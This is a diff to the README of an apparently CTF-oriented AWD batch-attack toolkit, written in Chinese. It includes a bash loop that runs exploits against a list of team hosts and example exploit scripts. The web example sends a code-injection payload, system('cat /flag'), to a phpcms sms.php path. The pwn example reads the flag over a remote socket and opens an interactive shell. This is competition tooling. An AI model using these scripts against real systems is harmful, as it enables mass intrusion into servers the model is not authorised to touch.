@@ -12,23 +12,21 @@ AWD批量攻击脚本(Web/Pwn通用)，通过bash编写，远程信息采用参�
 
 ```
 .
-├── init : 为每个题目创建文件夹和初始化文件
-├── init_hosts : 规划队伍ip和端口
-├── attack : 批量攻击脚本
-├── exp : awd pwn exp脚本 [自己使用]
-├── hosts: 攻击靶机远程信息，ip:port
-├── README.md
-├── submit_flag: 批量提交flag脚本
-├── upload: 文件上传脚本 [PWN使用]
-└── upload: 文件上传脚本 [PWN使用]
-
+├── attack.sh : 批量攻击脚本
+├── hosts : 攻击靶机远程信息，ip:port
+├── init_hosts.sh : 初始化队伍ip和端口，将信息储存在hosts文件
+├── init_path.sh : 初始化文件目录，web && pwn [一般不使用]
+├── pwn_exp.py : awd pwn exp脚本例子
+├── pwn_upload.py : 文件上传脚本 [PWN使用]
+├── submit_flag.py  : 批量提交flag脚本
+└── web_exp.py : awd web exp脚本例子
 ```
 
 
 
 ## 批量如何使用？
 
-attack脚本就是批量攻击脚本，攻击脚本如下。
+attack.sh脚本就是批量攻击脚本，攻击脚本如下。
 
 ```sh
 #! /bin/sh
@@ -52,7 +50,7 @@ log() {
 attack() {
     rm flags
     for line in `cat hosts`;do
-        timeout --foreground $run_time python ./exp $line & # 调用exp，传入远程信息。
+        timeout --foreground $run_time  python ./web_exp.py $line & # 调用exp，传入远程信息。
         sleep $next_attack_time # 两次攻击之间的间隔时间，不要设置为0,不然会出现莫名奇妙的错误
     done
     echo -e "\x1b[47;30m Waitting $wait_submit_time s to submit flag\x1b[0m"
@@ -107,29 +105,74 @@ server_port = int(sys.argv[1].split(':')[1])
 
 
 
-[PWN] 拿到shell后建议采用如下方式写入flags
+拿到flag之后建议在自己的exp中调用以下函数将flag写入到./flags文件
 
 ```python
-def cat_flag():
-    flag_header = b'flag{'
-    sleep(1)
-    sl('cat flag')
-    ru(flag_header)
-    flag = flag_header + ru('}') + b'}'
-    write_to_flags(flag + b'\n')
-    write_to_logs(b'\nexploited: ' + server_ip.encode() + b':' + str(server_port).encode() + flag)
-    exit(0)
-
 def write_to_flags(d):
     fd = open('./flags', 'ab')
-    fd.write(d)
-    fd.close()
-
-def write_to_logs(d):
-    fd = open('./logs', 'ab')
-    fd.write(d)
+    fd.write(d + b'\n')
     fd.close()
 ```
 
 Web的话师傅们自行调整下。
+
+
+
+
+
+web exp例子
+
+```python
+#! /usr/bin/python3
+import os
+import sys
+import requests
+
+def write_to_flags(d):
+	fd = open('./flags', 'ab')
+	fd.write(d + b'\n')
+	fd.close()
+
+server_ip = sys.argv[1].split(':')[0]
+server_port = sys.argv[1].split(':')[1]
+url = 'http://'
+url += server_ip + ':' + server_port + '/phpcms/modules/sms/sms.php?a=system(%27cat%20/flag%27);'
+res = requests.get(url,timeout=2)
+data = res.text
+flag = ('flag{' + data.split('{')[1]).split('}')[0] + '}'
+
+#data = data.split('}')[0] + '}\n'
+print(flag)
+write_to_flags(flag.encode())
+```
+
+
+
+pwn_exp例子:
+
+```python
+#!/usr/bin/env python3
+# A script for awd exp
+
+from pwn import *
+import os
+import sys
+
+def write_to_flags(d):
+    fd = open('./flags', 'ab')
+    fd.write(d + b'\n')
+    fd.close()
+
+ip = server_ip = sys.argv[1].split(':')[0]
+port = int(sys.argv[1].split(':')[1])
+io = remote(ip, port)
+
+io.sendline('cat flag')
+io.recvuntil('{')
+flag = 'flag{' + io.recvuntil('}')
+write_to_flags(flag)
+
+
+io.interactive()
+```
 
